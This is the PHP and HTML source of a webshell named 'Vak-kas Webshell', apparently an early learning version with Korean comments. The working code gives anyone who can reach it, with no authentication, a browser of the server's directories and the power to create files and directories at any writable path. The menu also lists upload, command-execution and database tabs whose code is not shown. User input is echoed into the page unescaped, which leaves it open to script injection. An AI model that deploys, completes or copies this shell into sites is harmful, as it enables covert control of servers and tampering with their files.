<?php
    header("Content-Type: text/html; charset=UTF8");
    $mode = isset($_REQUEST["mode"]) ? $_REQUEST["mode"] : "fileBrowser";
    $path = isset($_REQUEST["path"]) ? $_REQUEST["path"] : "";
    $page = basename($_SERVER["PHP_SELF"]); //basename은 경로에서 모든 부분 다 짜르고 딱 파일명만 가져옴
    $fileName = isset($_GET["fileName"]) ? $_GET["fileName"] : "";

    if(empty($path)){
        $tempFileName = basename(__FILE__); // 현재 파일명을 basename으로 가져옴 -> magic constant 미리 정의된 상수
        $tempPath = realpath(__FILE__); // 절대 경로를 가져옴.
        $path = str_replace($tempFileName, "", $tempPath); //맨 뒤에 있는 파일명을 공백으로 처리해서 진짜 경로만 가져오기
        $path = str_replace("\\", "/", $path); // 윈도우같으면 경로가 역슬래시라서 바꿔주기
    } else {
        $path = realpath($path)."/";
        $path = str_replace("\\", "/", $path);
    }

    #Mode Logic
    if($mode == "fileCreate"){
        if(empty($fileName)){
            echo "<script>alert('파일명이 입력되지 않았습니다.'); history.back(-1) ;</script>";
            exit();
        }
        $fp = fopen($path.$fileName, "w");
        fclose($fp);
        echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
    }
    else if($mode == "dirCreate"){
        if(empty($fileName)){
            echo "<script>alert('디렉터리명이 입력되지 않았습니다.'); history.back(-1) ;</script>";
            exit();
        }

        $dirPath = $path.$fileName;
        if(is_dir($dirPath)){ // 디렉터리가 존재하는가?
            echo "<script>alert('해당 디렉터리 명이 존재합니다.')</script>";
            exit();
        }
        mkdir($dirPath);
        echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";

    }

    # Directory List Return Function
    function getDirList($getPath) {
        $listArr = array(); 
        $handler = opendir($getPath);
        while($file = readdir($handler)) { 
            if(is_dir($getPath.$file) == "1") {  //디렉터리일 경우에만 배열에 넣기
                $listArr[] = $file;
            }
        }
        closedir($handler);
        return $listArr;
    }

    # File List Return Function
    function getFileList($getPath) {
        $listArr = array(); 
        $handler = opendir($getPath);
        while($file = readdir($handler)) { 
            if(is_dir($getPath.$file) != "1") {  //파일일 경우에만 배열에 넣기
                $listArr[] = $file;
            }
        }
        closedir($handler);
        return $listArr;
    }
?>
<!DOCTYPE html>
<html lang="ko">
<head>
    <title>Vak-kas Webshell</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
    <script>
        function fileCreate() {
            var fileName = frm.createFileName.value;
            if(!fileName) { 
                alert("파일명을 입력하세요.");
                return;
            }
            location.href = "<?php echo $page ?>?mode=fileCreate&path=<?php echo $path ?>&fileName=" + fileName;
        }

        function dirCreate() {
            var fileName = frm.createFileName.value;
            if(!fileName) { 
                alert("디렉터리명을 입력하세요.");
                return;
            }
            location.href = "<?php echo $page ?>?mode=dirCreate&path=<?php echo $path ?>&fileName=" + fileName;
        }
    </script>
</head>
<body>
<div class="container-fluid">
    <div class="row">
    <div class='col-md-2'></div>
    <div class='col-md-8'>
        <h3>Webshell <small>Create by Vak-kas</small></h3>
        <hr>
        <ul class="nav nav-tabs">
        <li role="presentation" <?php if($mode == "fileBrowser") echo 'class="active"'; ?>><a href="<?=$page?>?mode=fileBrowser">File Browser</a></li>
        <li role="presentation" <?php if($mode == "fileUpload") echo 'class="active"'; ?>><a href="<?=$page?>?mode=fileUpload">File Upload</a></li>
        <li role="presentation" <?php if($mode == "command") echo 'class="active"'; ?>><a href="<?=$page?>?mode=command">Command Execution</a></li>
        <li role="presentation" <?php if($mode == "db") echo 'class="active"'; ?>><a href="<?=$page?>?mode=db">DB Connector</a></li>
        <li role="presentation"><a href="<?=$page?>?mode=logout">Logout</a></li>
        </ul>
        <br>
        <?php if($mode == "fileBrowser") { ?>
            <form action="<?php echo $page?>?mode=fileBrowser" method="GET">
                <div class="input-group">
                    <span class="input-group-addon">Current Path</span>
                    <input type="text" class="form-control" placeholder = "Path Input..." name="path" value="<?php echo $path ?>">
                    <span class="input-group-btn">
                        <button class="btn btn-default" type="submit">Move</button>
                    </span>
                </div>
            </form>
            <hr>
            <div class="table-responsive">
                <table class="table table-bordered table-hover" style="table-layout: fixed; word-break : break-all;">
                    <thead>
                        <tr class="active">
                            <th style="width: 50%" class="text-center">Name</th>
                            <th style="width: 14%" class="text-center">Type</th>
                            <th style="width: 18%" class="text-center">Date</th>
                            <th style="width: 18%" class="text-center">Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <!-- 디렉터리만 출력하기 -->
                            <?php
                                $dirList = getDirList($path);
                                for($i=0;$i<count($dirList);$i++){
                                    if($dirList[$i] != ".") {
                                    $dirDate = date("Y-m-d H:i", filemtime($path.$dirList[$i]));
                            ?>
                            <td style="vertical-align: middle" class="text-primary"><b><span class="glyphicon glyphicon-folder-open" aria-hidden="true"></span>&nbsp;&nbsp;
                                <a href="<?php echo $page?>?mode=fileBrowser&path=<?php echo $path?><?php echo $dirList[$i]?>"><?php echo $dirList[$i]?></a></b></td>
                            <td style="vertical-align: middle" class="text-center"><code>Directory</code></td>
                            <td style="vertical-align: middle" class="text-center"><?php echo $dirDate ?></td>
                            <td style="vertical-align: middle" class="text-center">
                                <?php if($dirList[$i] !="..") { ?>
                                <div class="btn-group btn-group-sm" role="group" aria-label="...">
                                    <button type="button" class="btn btn-danger" title ="File Delete"><span class="glyphicon glyphicon-trash" aria-hidden"true"></span></button>
                                </div>
                                <?php } ?>
                            </td>
                        </tr>
                        <?php }
                            }
                        ?>

                        <!-- 파일 출력하기 -->
                        <?php
                            $fileList = getFileList($path);
                            for($i=0;$i<count($fileList);$i++){
                                $fileDate = date("Y-m-d H:i", filemtime($path.$fileList[$i]));
                        ?>
                            <td style="vertical-align: middle"><span class="glyphicon glyphicon-file" aria-hidden="true"></span> <?php echo $fileList[$i]?></td>
                            <td style="vertical-align: middle" class="text-center"><kbd>file</kbd></td>
                            <td style="vertical-align: middle" class="text-center"><?php echo $fileDate ?></td>
                            <td style="vertical-align: middle" class="text-center">
                                <div class="btn-group btn-group-sm" role="group" aria-label="...">
                                    <button type="button" class="btn btn-info" title = "File Download"><span class="glyphicon glyphicon-save" aria-hidden"true"></span></button>
                                    <button type="button" class="btn btn-warning" title = "File Modify"><span class="glyphicon glyphicon-wrench" aria-hidden"true"></span></button>
                                    <button type="button" class="btn btn-danger" title ="File Delete"><span class="glyphicon glyphicon-trash" aria-hidden"true"></span></button>
                                </div>
                            </td>
                        </tr>
                        <?php } ?>

                    </tbody>
                </table>
            </div>
            <hr>

            <!-- 파일 생성, 디렉터리 생성하기 -->
            <form name="frm">
                <div class="input-group">
                    <input type="text" class="form-control" placeholder = "File/Directory Name Input" name="createFileName">
                    <span class="input-group-btn">
                    <button class="btn btn-default" type="button" onclick="fileCreate()">File Create</button>
                        <button class="btn btn-default" type="button" onclick = "dirCreate()" >Directory Create</button>
                    </span>
                </div>
            </form>
            

        <?php } ?>




        <hr>
        <p class="text-muted text-center">Copyright© 2025, Vak-kas, All rights reserved.</p>
    </div>
    <div class='col-md-2'></div>
    </div>
</div>
    
</body>
</html>